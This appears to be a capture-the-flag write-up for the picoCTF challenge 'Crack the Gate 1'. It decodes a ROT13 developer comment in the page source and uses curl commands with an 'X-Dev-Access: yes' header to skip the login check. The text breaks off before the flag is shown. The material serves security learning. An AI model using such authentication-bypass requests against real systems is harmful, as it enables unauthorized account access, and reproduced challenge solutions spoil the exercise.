Solution Approach for Crack the Gate 1

Access a restricted portal using developer backdoor credentials to retrieve the flag for user ctf-player@picoctf.org.
Step-by-Step Solution
1. Initial Reconnaissance

Upon loading the login page, the first step was to inspect the page source for any hidden information.

Action: Right-click → "View Page Source" (or Ctrl+U)
2. Discovering the Hidden Comment

The source code contained a suspicious HTML comment that appeared to be encoded:
html

<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->

The comment's structure and the warning "Remove before pushing to production!" strongly suggested this was a developer note containing access instructions.
3. Decoding the Message

The comment text appeared to be ROT13-encoded (common CTF encoding). Using a simple ROT13 decoder:
bash

echo 'ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"' \
  | tr 'A-Za-z' 'N-ZA-Mn-za-m'

Result:
text

NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"

This revealed a developer backdoor mechanism - sending the custom header X-Dev-Access: yes would bypass normal authentication.
4. Verifying the Backdoor

First, test if the header is recognized by the server:
bash

curl -i -H "X-Dev-Access: yes" "http://amiable-citadel.picoctf.net:53947/"

The server responded normally, confirming the endpoint was active.
5. Exploiting the Backdoor

The goal was to log in as ctf-player@picoctf.org. Using the discovered header, send a POST request to the login endpoint:
bash

curl -s -X POST \
  -H "X-Dev-Access: yes" \
  -H "Content-Type: application/json" \
  -d '{"email":"ctf-player@picoctf.org","password":"whatever"}' \
  "http://amiable-citadel.picoctf.net:53947/login"

Note: The password can be any value since the backdoor bypasses authentication.
6. Retrieving the Flag

The server responded with JSON containing the flag:
